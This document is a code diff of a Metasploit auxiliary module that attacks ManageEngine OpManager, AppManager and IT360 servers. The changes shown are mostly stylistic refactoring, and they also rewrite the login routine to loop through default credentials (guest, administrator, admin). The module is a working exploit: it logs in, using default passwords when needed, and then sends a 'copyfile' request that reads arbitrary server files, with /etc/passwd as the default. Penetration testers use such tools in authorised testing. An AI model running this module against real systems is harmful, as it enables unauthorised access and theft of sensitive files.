@@ -43,7 +43,7 @@ class Metasploit3 < Msf::Auxiliary
       [
         Opt::RPORT(80),
         OptString.new('TARGETURI', [true, "The base path to OpManager, AppManager or IT360", '/']),
-        OptString.new('FILEPATH', [false, 'Path of the file to download', '/etc/passwd']),
+        OptString.new('FILEPATH', [true, 'Path of the file to download', '/etc/passwd']),
         OptString.new('IAMAGENTTICKET', [false, 'Pre-authenticated IAMAGENTTICKET cookie (IT360 target only)']),
         OptString.new('USERNAME', [false, 'The username to login as (IT360 target only)']),
         OptString.new('PASSWORD', [false, 'Password for the specified username (IT360 target only)']),
@@ -53,34 +53,40 @@ class Metasploit3 < Msf::Auxiliary
 
 
   def get_cookie
+    cookie = nil
     res = send_request_cgi({
       'method' => 'GET',
       'uri' => normalize_uri(datastore['TARGETURI'])
     })
-    if res
-      return res.get_cookies
-    end
-  end
 
+    if res
+      cookie = res.get_cookies
+    end
+
+    cookie
+  end
 
   def detect_it360
     res = send_request_cgi({
-      'uri'    => "/",
+      'uri'    => '/',
       'method' => 'GET'
     })
+
     if res && res.get_cookies.to_s =~ /IAMAGENTTICKET([A-Z]{0,4})/
       return true
     end
+
     return false
   end
-
 
   def get_it360_cookie_name
     res = send_request_cgi({
       'method' => 'GET',
-      'uri' => normalize_uri("/"),
+      'uri' => normalize_uri('/')
     })
+
     cookie = res.get_cookies
+
     if cookie =~ /IAMAGENTTICKET([A-Z]{0,4})/
       return $1
     else
@@ -88,60 +94,54 @@ class Metasploit3 < Msf::Auxiliary
     end
   end
 
-
   def authenticate_it360(port, path, username, password)
-    if datastore['DOMAIN_NAME'] == nil
+    if datastore['DOMAIN_NAME'].nil?
       vars_post = {
-          'LOGIN_ID' => username,
-          'PASSWORD' => password,
-          'isADEnabled' => "false"
+        'LOGIN_ID' => username,
+        'PASSWORD' => password,
+        'isADEnabled' => 'false'
       }
     else
       vars_post = {
-          'LOGIN_ID' => username,
-          'PASSWORD' => password,
-          'isADEnabled' => "true",
-          'domainName' => datastore['DOMAIN_NAME']
+        'LOGIN_ID' => username,
+        'PASSWORD' => password,
+        'isADEnabled' => 'true',
+        'domainName' => datastore['DOMAIN_NAME']
       }
     end
 
-    op_port = datastore['RPORT']
-    datastore['RPORT'] = port
-
     res = send_request_cgi({
+      'rport' => port,
       'method' => 'POST',
       'uri' => normalize_uri(path),
       'vars_get' => {
-        'service' => "OpManager",
-        'furl' => "/",
+        'service' => 'OpManager',
+        'furl' => '/',
         'timestamp' => Time.now.to_i
       },
       'vars_post' => vars_post
-    })
-
-    datastore['RPORT'] = op_port
+      })
 
     if res && res.get_cookies.to_s =~ /IAMAGENTTICKET([A-Z]{0,4})=([\w]{9,})/
       # /IAMAGENTTICKET([A-Z]{0,4})=([\w]{9,})/ -> this pattern is to avoid matching "removed"
       return res.get_cookies
-    else
-      return nil
     end
-  end
 
+    nil
+  end
 
   def login_it360
     # Do we already have a valid cookie? If yes, just return that.
-    if datastore['IAMAGENTTICKET'] != nil
+    unless datastore['IAMAGENTTICKET'].nil?
       cookie_name = get_it360_cookie_name
-      cookie = "IAMAGENTTICKET" + cookie_name + "=" + datastore['IAMAGENTTICKET'] + ";"
+      cookie = 'IAMAGENTTICKET' + cookie_name + '=' + datastore['IAMAGENTTICKET'] + ';'
       return cookie
     end
 
     # get the correct path, host and port
     res = send_request_cgi({
       'method' => 'GET',
-      'uri' => normalize_uri("/"),
+      'uri' => normalize_uri('/')
     })
 
     if res && res.redirect?
@@ -150,37 +150,38 @@ class Metasploit3 < Msf::Auxiliary
       return nil
     end
 
-    cookie = authenticate_it360(uri[0], uri[1], datastore['USERNAME'], datastore['PASSWORD'])
-    if cookie != nil
-      return cookie
-    elsif datastore['USERNAME'] == 'guest' && datastore['JSESSIONID'] == nil
-      # we've tried with the default guest password, now let's try with the default admin password
-      cookie = authenticate_it360(uri[0], uri[1], 'administrator', 'administrator')
-      if cookie != nil
+    if datastore['USERNAME'] && datastore['PASSWORD']
+      print_status("#{peer} - Trying to authenticate as #{datastore['USERNAME']}/#{datastore['PASSWORD']}...")
+      cookie = authenticate_it360(uri[0], uri[1], datastore['USERNAME'], datastore['PASSWORD'])
+      unless cookie.nil?
         return cookie
-      else
-        # Try one more time with the default admin login for some versions
-        cookie = authenticate_it360(uri[0], uri[1], 'admin', 'admin')
-        if cookie != nil
-          return cookie
-        end
       end
     end
-    return nil
-  end
 
+    default_users = ['guest', 'administrator', 'admin']
+
+    default_users.each do |user|
+      print_status("#{peer} - Trying to authenticate as #{user}...")
+      cookie = authenticate_it360(uri[0], uri[1], user, user)
+      unless cookie.nil?
+        return cookie
+      end
+    end
+
+    nil
+  end
 
   def run
     # No point to continue if filepath is not specified
-    if datastore['FILEPATH'].nil? || datastore['FILEPATH'].empty?
-      print_error("Please supply the path of the file you want to download.")
+    if datastore['FILEPATH'].empty?
+      print_error('Please supply the path of the file you want to download.')
       return
     end
 
     if detect_it360
       print_status("#{peer} - Detected IT360, attempting to login...")
       cookie = login_it360
-      if cookie == nil
+      if cookie.nil?
         print_error("#{peer} - Failed to login to IT360!")
         return
       end
@@ -208,7 +209,7 @@ class Metasploit3 < Msf::Auxiliary
         'vars_get' => {
           'operation' => 'copyfile',
           'fileName' => datastore['FILEPATH']
-        },
+        }
       })
     rescue Rex::ConnectionRefused
       print_error("#{peer} - Could not connect.")
@@ -217,10 +218,12 @@ class Metasploit3 < Msf::Auxiliary
 
     # Show data if needed
     if res && res.code == 200
+
       if res.body.to_s.bytesize == 0
         print_error("#{peer} - 0 bytes returned, file does not exist or is empty.")
         return
       end
+
       vprint_line(res.body.to_s)
       fname = File.basename(datastore['FILEPATH'])
 
